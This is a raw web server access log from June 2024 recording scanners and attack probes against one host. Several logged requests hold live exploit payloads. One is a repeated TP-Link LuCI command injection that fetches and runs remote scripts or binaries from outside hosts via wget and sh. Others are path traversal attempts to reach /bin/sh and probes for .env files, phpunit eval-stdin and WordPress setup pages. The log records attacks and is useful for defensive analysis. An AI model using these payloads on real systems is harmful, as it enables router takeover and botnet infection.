188.166.107.136 - - [20/Jun/2024:02:23:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
46.19.143.66 - - [20/Jun/2024:02:30:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:02:33:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:03:02:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [20/Jun/2024:03:02:50 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
147.185.132.28 - - [20/Jun/2024:03:05:41 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03o\xAA\xB2\xD0`\xDCo\x96\x02C\x10a\xD0\xEDu\xE3\xA3$\xA2\xB0h\xE9}\xFF7\x87g+\x83\xB6\x15\x11\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
147.185.132.28 - - [20/Jun/2024:03:05:41 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03X4a\x89\x9C\xEB \x8C\xD1\xF7?r\xB1\xB8\x1B\xA6W\xCE\x8A\xFE\x8C$\xE2y\x80H4\xA7\xC38\x87X <\x8E\xB3\x87\xA0\xD8\xE1\x1E\xCD\x03\xAAFG\xC7C\xFE\xB8\xCEBc>\xF1\xE4-P]R\xA7Nh\x5C1\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
185.191.127.212 - - [20/Jun/2024:03:06:09 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
66.249.75.105 - - [20/Jun/2024:03:06:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.175 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
92.249.48.222 - - [20/Jun/2024:03:16:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:03:32:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
206.168.34.193 - - [20/Jun/2024:03:43:15 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
206.168.34.193 - - [20/Jun/2024:03:43:27 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
46.19.143.66 - - [20/Jun/2024:03:44:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:03:58:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:04:12:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
162.216.150.59 - - [20/Jun/2024:04:14:08 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
79.137.205.100 - - [20/Jun/2024:04:24:50 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03eq\x07]\xEE\x9B\x91[\xEE}\xE0K\x80`f\xF8\xFF\xC1\x85\xD5\x86\xB9\xF8a\x1E{n/\xE6\xA36I \x16\xD1&\xF8\xE4w\x0B\xDC[y*\xE03\x07z>\xB6I\x19\x18\xCD\x0F\x97\x1E" 400 154 "-" "-"
79.137.205.100 - - [20/Jun/2024:04:24:50 +0000] "GET /script HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
79.137.205.100 - - [20/Jun/2024:04:24:51 +0000] "GET /script HTTP/1.1" 301 166 "http://180.233.121.154:1081/script" "Mozilla/5.0 (Linux; Android 7.0; PRA-LX1 Build/HUAWEIPRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36"
185.191.127.212 - - [20/Jun/2024:04:26:55 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
141.98.11.189 - - [20/Jun/2024:04:32:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
92.249.48.222 - - [20/Jun/2024:04:36:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [20/Jun/2024:04:48:18 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [20/Jun/2024:04:52:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.244.36.206 - - [20/Jun/2024:15:06:15 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.191.127.212 - - [20/Jun/2024:15:14:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:15:16:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:15:33:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [20/Jun/2024:15:56:02 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:15:56:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [20/Jun/2024:15:59:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [20/Jun/2024:16:07:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.222 - - [20/Jun/2024:16:15:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:16:38:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
180.233.121.154 - - [20/Jun/2024:16:52:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
43.159.128.172 - - [20/Jun/2024:16:57:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.249.48.222 - - [20/Jun/2024:17:00:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.67.234 - - [20/Jun/2024:17:09:34 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2869.0 Safari/537.36"
46.19.143.66 - - [20/Jun/2024:17:10:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:17:19:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:17:39:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
51.89.195.107 - - [20/Jun/2024:17:40:31 +0000] "GET /wp-content/plugins/google-seo-rank/README.txt HTTP/1.1" 301 166 "-" "Linux Mozilla"
51.89.195.107 - - [20/Jun/2024:17:40:37 +0000] "GET /blog/wp-content/plugins/google-seo-rank/README.txt HTTP/1.1" 301 166 "-" "Linux Mozilla"
51.89.195.107 - - [20/Jun/2024:17:40:43 +0000] "GET /wordpress/wp-content/plugins/google-seo-rank/README.txt HTTP/1.1" 301 166 "-" "Linux Mozilla"
51.89.195.107 - - [20/Jun/2024:17:40:49 +0000] "GET /wp/wp-content/plugins/google-seo-rank/README.txt HTTP/1.1" 301 166 "-" "Linux Mozilla"
51.89.195.107 - - [20/Jun/2024:17:40:56 +0000] "GET /site/wp-content/plugins/google-seo-rank/README.txt HTTP/1.1" 301 166 "-" "Linux Mozilla"
185.191.127.212 - - [20/Jun/2024:17:48:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:17:51:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
34.74.240.237 - - [20/Jun/2024:17:59:49 +0000] "GET /robots.txt HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
34.74.240.237 - - [20/Jun/2024:17:59:49 +0000] "GET / HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
34.74.240.237 - - [20/Jun/2024:18:00:31 +0000] "GET /robots.txt HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
34.74.240.237 - - [20/Jun/2024:18:00:32 +0000] "GET / HTTP/1.0" 301 166 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
185.191.127.212 - - [20/Jun/2024:18:03:31 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
162.216.150.127 - - [20/Jun/2024:18:07:43 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.222 - - [20/Jun/2024:18:17:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [20/Jun/2024:18:22:50 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [20/Jun/2024:18:22:50 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
46.19.143.66 - - [20/Jun/2024:18:25:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
159.223.92.75 - - [20/Jun/2024:18:32:10 +0000] "GET /wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
159.223.92.75 - - [20/Jun/2024:18:32:10 +0000] "GET /wordpress/wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
159.223.92.75 - - [20/Jun/2024:18:32:11 +0000] "GET /old/wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
159.223.92.75 - - [20/Jun/2024:18:32:11 +0000] "GET /OLD/wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
159.223.92.75 - - [20/Jun/2024:18:32:11 +0000] "GET /wp-admin/install.php?step=1 HTTP/1.1" 301 166 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
45.84.89.2 - - [20/Jun/2024:18:32:12 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06\xC00\x00\x9C\x00\x9D\x01\x00\x00R\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 154 "-" "-"
92.249.48.222 - - [20/Jun/2024:18:37:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [20/Jun/2024:18:47:21 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [20/Jun/2024:18:51:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [20/Jun/2024:18:53:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
92.249.48.222 - - [20/Jun/2024:19:12:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [20/Jun/2024:19:32:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [20/Jun/2024:19:38:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:19:39:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [20/Jun/2024:19:39:56 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:19:58:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:20:13:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [20/Jun/2024:20:24:46 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.191.127.212 - - [20/Jun/2024:20:32:24 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:20:33:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
138.197.208.187 - - [20/Jun/2024:20:52:11 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF1\xE8\x11\xDD\xA2\xB4\xC2\x1E\xA9\xA6\xA7\x92\xF70\x94\xB4\xFB1\xC6\x87h.\xC8\xE5E=&\xECbP\x01t\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
138.197.208.187 - - [20/Jun/2024:20:52:11 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03B)\x83!S\x1C\xE2p\xEB \xE9\xFE\xF5\x1C\x0B\xD8\x0E\x1B>\xA6\xDC\x89\xBC\x8D\xA0\xB6;\x12z\xC0\x16\x95\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
138.197.208.187 - - [20/Jun/2024:20:52:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:12 +0000] "GET /form.html HTTP/1.1" 301 166 "-" "curl/8.1.2"
138.197.208.187 - - [20/Jun/2024:20:52:13 +0000] "GET /upl.php HTTP/1.1" 301 166 "-" "Mozilla/5.0"
138.197.208.187 - - [20/Jun/2024:20:52:14 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x95\xDE|v\x8E\xA6\xFB\xC9\xB8\x17LO\x02r\x16\xFFz]\x1C\xC0\x5CP\x01s\x8B\x8F\xF2!\x98\xC1+\x8F\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
138.197.208.187 - - [20/Jun/2024:20:52:14 +0000] "GET /geoip/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:15 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:15 +0000] "GET /1.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:16 +0000] "GET /bundle.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:16 +0000] "GET /files/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:17 +0000] "GET /systembc/password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:17 +0000] "GET /password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.208.187 - - [20/Jun/2024:20:52:18 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.19.143.66 - - [20/Jun/2024:20:54:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:21:01:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [20/Jun/2024:21:07:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [20/Jun/2024:21:07:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
170.106.104.42 - - [20/Jun/2024:21:18:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.249.48.222 - - [20/Jun/2024:21:21:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:21:33:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
66.249.79.76 - - [20/Jun/2024:21:39:01 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.74 - - [20/Jun/2024:21:39:05 +0000] "GET /ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
92.249.48.222 - - [20/Jun/2024:21:58:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [20/Jun/2024:22:07:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
40.78.94.168 - - [20/Jun/2024:22:11:00 +0000] "MGLNDD_180.233.121.154_80" 400 154 "-" "-"
92.249.48.222 - - [20/Jun/2024:22:11:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [20/Jun/2024:22:15:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
103.125.233.26 - - [20/Jun/2024:22:21:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
185.191.127.212 - - [20/Jun/2024:22:35:25 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:22:38:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
199.45.155.73 - - [20/Jun/2024:22:46:19 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.155.73 - - [20/Jun/2024:22:46:31 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
150.109.13.194 - - [20/Jun/2024:22:49:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.249.48.222 - - [20/Jun/2024:22:54:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
39.40.216.231 - - [20/Jun/2024:22:59:17 +0000] "POST /HNAP1/ HTTP/1.0" 301 166 "-" "-"
92.249.48.222 - - [20/Jun/2024:23:13:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
170.106.101.31 - - [20/Jun/2024:23:14:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
152.42.184.218 - - [20/Jun/2024:23:17:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
152.42.184.218 - - [20/Jun/2024:23:17:15 +0000] "" 400 0 "-" "-"
46.19.143.66 - - [20/Jun/2024:23:19:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
194.54.163.111 - - [20/Jun/2024:23:26:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
198.235.24.237 - - [20/Jun/2024:23:31:44 +0000] "GET / HTTP/1.0" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.222 - - [20/Jun/2024:23:39:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.189 - - [20/Jun/2024:23:44:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
170.64.228.80 - - [20/Jun/2024:23:45:47 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
170.64.228.80 - - [20/Jun/2024:23:45:48 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
170.64.228.80 - - [20/Jun/2024:23:45:51 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 166 "-" "Custom-AsyncHttpClient"
185.191.127.212 - - [20/Jun/2024:23:51:23 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:23:55:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.209.35.171 - - [21/Jun/2024:00:00:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
92.249.48.222 - - [21/Jun/2024:00:14:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
198.235.24.95 - - [21/Jun/2024:00:34:29 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x035\x8F\xB2\x7F\x98\xFD\xEF>\xCC1n22\x8E" 400 154 "-" "-"
198.235.24.95 - - [21/Jun/2024:00:34:29 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xCA\x87l\xC3Y`\xF9}\x01M'\xFF2\xBC\x0F\x1A\xC4u\x13D\x5C\x81\xBBJ\xA2\x7F\xA1\xA2\xB8Z\x83\x19\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
92.249.48.222 - - [21/Jun/2024:00:35:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [21/Jun/2024:00:39:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.127.212 - - [21/Jun/2024:00:46:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:00:52:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [21/Jun/2024:01:12:53 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
179.43.161.135 - - [21/Jun/2024:01:14:48 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
